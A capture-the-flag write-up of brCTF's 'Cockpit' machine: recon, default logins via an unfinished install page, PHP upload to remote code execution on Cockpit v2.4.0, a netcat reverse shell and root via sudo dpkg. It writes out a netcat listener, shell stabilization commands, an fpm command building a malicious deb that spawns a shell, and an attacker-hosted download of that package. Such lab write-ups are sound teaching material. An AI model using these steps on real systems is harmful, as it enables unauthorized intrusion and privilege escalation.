# Cockpit Machine from brCTF

## Information Gathering/Reconnaissance
As usual we fire up our favorite network mapper (nmap) and perform some basic recon. We can see that we have only port 80 (http) open.
`nmap -sC -sV -oN cockpit.nmap 10.0.160.145`
```
Nmap scan report for 10.0.160.145
Host is up (0.24s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.18.0
|_http-server-header: nginx/1.18.0
| http-title: Cockpit
|_Requested resource was /auth/login?to=%2F

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
```

In the second stage of our recon we checkout the application running on port `80` from our browser. <br>
We are greeted with a homepage.... interesting!
![Cockpit Homepage](https://github.com/theMcSam/brCTF-writeups/blob/main/cockpit/images/homepage.png "a title")

Next we try to find out what other pages are available on our target. We employ the servies of our directory bruteforcing tool (feroxbuster) or an other webfuzzer. <br>
`feroxbuster -u http://10.0.160.145 -w /raft-medium-wordlists.txt`
```
302      GET        0l        0w        0c http://10.0.160.145/ => http://10.0.160.145/auth/login?to=%2F
302      GET        0l        0w        0c http://10.0.160.145/system => http://10.0.160.145/auth/login?to=%2Fsystem
400      GET        7l       11w      157c http://10.0.160.145/!%22%C2%A3$%^
302      GET        0l        0w        0c http://10.0.160.145/?????? => http://10.0.160.145/auth/login?to=%2F%3F%253F%253F%253F%253F%253F%3D
400      GET        7l       11w      157c http://10.0.160.145/100%sexy
400      GET        7l       11w      157c http://10.0.160.145/100%angel
400      GET        7l       11w      157c http://10.0.160.145/100%bitch
400      GET        7l       11w      157c http://10.0.160.145/100%me
400      GET        7l       11w      157c http://10.0.160.145/100%cute
400      GET        7l       11w      157c http://10.0.160.145/100%love
400      GET        7l       11w      157c http://10.0.160.145/!%22%C2%A3$%^&*()
302      GET        0l        0w        0c http://10.0.160.145/content => http://10.0.160.145/auth/login?to=%2Fcontent
400      GET        7l       11w      157c http://10.0.160.145/100%cool
301      GET        7l       11w      169c http://10.0.160.145/install => http://10.0.160.145/install/
404      GET        0l        0w        0c http://10.0.160.145/austin101
```

## Exploitation
Something interesting the results above. We find a `/install` endpoint. <br>
After visiting this page in the browser we realized that the system administrator setup cockpit application without fully installing. Nice! we can abuse this. <br> After visiting this endpoint cockpit will be installed and will setup an account with default logins.
![Cockpit Install Page](https://github.com/theMcSam/brCTF-writeups/blob/main/cockpit/images/install_the_software.png "a title")

Using the default logins obtained on installation we can login to the cockpit application.
![Cockpit Login Page](https://github.com/theMcSam/brCTF-writeups/blob/main/cockpit/images/login_with_default_creds.png "a title")

Successful Login attempt and we a greeted with the application dashboard. From there we can do a little recon to find out the version of cockpit running. From the image below, `cockpit v2.4.0` is found to be running.
![Cockpit Dashboard Page](https://github.com/theMcSam/brCTF-writeups/blob/main/cockpit/images/cockpit_version_info.png "a title")

As a hacker google should be one of your cherished tools. Using the google search engine we can search for publicly available exploit for `cockpit v2.4.0`. <br> We find a publicly disclosed exploitation process [here](https://huntr.dev/bounties/f73eef49-004f-4b3b-9717-90525e65ba61/).
![Public Exploit](https://github.com/theMcSam/brCTF-writeups/blob/main/cockpit/images/google_vuln.png "a title")

From the steps provided on the [website](https://huntr.dev/bounties/f73eef49-004f-4b3b-9717-90525e65ba61/).
1. We must first craft our malicious php script.
![exploit code](https://github.com/theMcSam/brCTF-writeups/blob/main/cockpit/images/exploit_code.png "a title")

2. Head over to the assest page on cockpit and upload our malicious php script.
![uploading asset](https://github.com/theMcSam/brCTF-writeups/blob/main/cockpit/images/asset_upload.png "a title")
![uploading php script](https://github.com/theMcSam/brCTF-writeups/blob/main/cockpit/images/uploading_php_script.png "a title")

3. Click on the options icons after fully uploding the asset and select `copy asset link` from the popup.
![uploading php script](https://github.com/theMcSam/brCTF-writeups/blob/main/cockpit/images/asset_options.png "a title")

4. Open a new browser tab and paste the link there. Hold up! one last thing to do before execution. After pasting the link remove `/http:` from the url and now you can execute.

Finally! we now have RCE on the target and we can get a shell on netcat.<br>
We first start by running our netcat listener.
`nc -lnvp 8989`
![uploading php script](https://github.com/theMcSam/brCTF-writeups/blob/main/cockpit/images/listening_on_netcat.png "a title")

Now we can send execute command on our malicious php web page to get a shell on our listener.<br>
![netcat payload shell](https://github.com/theMcSam/brCTF-writeups/blob/main/cockpit/images/netcat_payload.png)

Boom we get a connection on our listener.
![netcat rev shell](https://github.com/theMcSam/brCTF-writeups/blob/main/cockpit/images/recieved_nc_connection.png)

## Post Exploitation
Anytime we get a shell through netcat we obtain a dumb shell. A dump shell has very little functionality and therefore we need a stable shell. Shell Stabilization prevents you from killing your reverse shell and adds proper shell functionalities.

#### Shell stabilization
Execute on target
1. Step 1: `python3 -c "import pty;pty.spawn('/bin/bash')"` <br>
2. Step 2: `export TERM=xterm-color` <br>
3. Step 3: `CTRL+z`<br>
On host machine.
4. Step 4: `stty raw -echo; fg` <br>
5. Step 5: `reset` <br>

## Privilege Escalation
We first check our privileges.
`sudo -l`
![PE vector](https://github.com/theMcSam/brCTF-writeups/blob/main/cockpit/images/priv_escalation.png)

Doing a search on for dpkg on [gtfobins](https://gtfobins.github.io/gtfobins/dpkg/#sudo)
![gfobins](https://github.com/theMcSam/brCTF-writeups/blob/main/cockpit/images/gtfobins_privesc.png)

Now the way this is going to work is that we would build a malcious debian package and then we try installing the package which will run our malicious code embedded in the package.<br>
Steps to building malicious package.
1. Install fpm: `sudo apt install ruby && sudo gem install fpm`
2. Build package with fpm: ```TF=$(mktemp -d) &&
echo 'exec /bin/sh' > $TF/x.sh &&
fpm -n x -s dir -t deb -a all --before-install $TF/x.sh $TF```
![mal deb package](https://github.com/theMcSam/brCTF-writeups/blob/main/cockpit/images/creating_mal_packgae.png)

We now have our malicious package on our host and we can now transfer to our target.<br>
Start your python server: `python3 -m http.server 8000`
![python transfer](https://github.com/theMcSam/brCTF-writeups/blob/main/cockpit/images/python_server_for_mal_package.png)

Download the malicious package on your target.<br>
NB: Make sure you are in a writable directory like `/tmp`. <br>

![python transfer download](https://github.com/theMcSam/brCTF-writeups/blob/main/cockpit/images/downloading_mal_package_from_attacker_server.png) 

Now we can execute and get root access.<br>
![execute code](https://github.com/theMcSam/brCTF-writeups/blob/main/cockpit/images/exec_command_priv_root.png)<br>
We are now root!!! :smiley: <br>
![iamroot](https://github.com/theMcSam/brCTF-writeups/blob/main/cockpit/images/i_am_root.png)